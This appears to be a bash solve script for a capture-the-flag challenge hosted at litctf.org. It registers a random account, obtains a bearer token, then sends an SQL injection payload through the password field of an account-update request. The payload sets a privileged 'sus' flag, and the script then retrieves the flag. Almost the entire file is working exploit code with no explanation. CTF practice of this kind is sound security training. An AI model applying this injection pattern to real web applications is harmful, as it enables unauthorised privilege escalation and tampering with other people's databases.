#!/bin/bash

URL="http://litctf.org:31783"

RANDOM_USERNAME=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n 1)

echo "Username: $RANDOM_USERNAME"

echo "Registering user..."

curl -s -X POST -d "username=$RANDOM_USERNAME&password=1234567890" $URL/signup > /dev/null

echo "Logging in..."

TOKEN=$(curl -s -X POST -d "username=$RANDOM_USERNAME&password=1234567890" $URL/login | jq -r ".token")

echo "Token: $TOKEN"

echo "Updaing account..."

PAYLOAD="username=$RANDOM_USERNAME&password=1234567890%22,%20sus=true%20WHERE%20username=%22$RANDOM_USERNAME%22%20/*"

echo "Payload: $PAYLOAD"

curl -s -X POST -H "Authorization: Bearer $TOKEN" -d $PAYLOAD $URL/account/update > /dev/null

echo "Getting flag..."

curl -s -H "Authorization: Bearer $TOKEN" $URL/flag | jq -r ".message" | grep -oE "LITCTF{.*}"
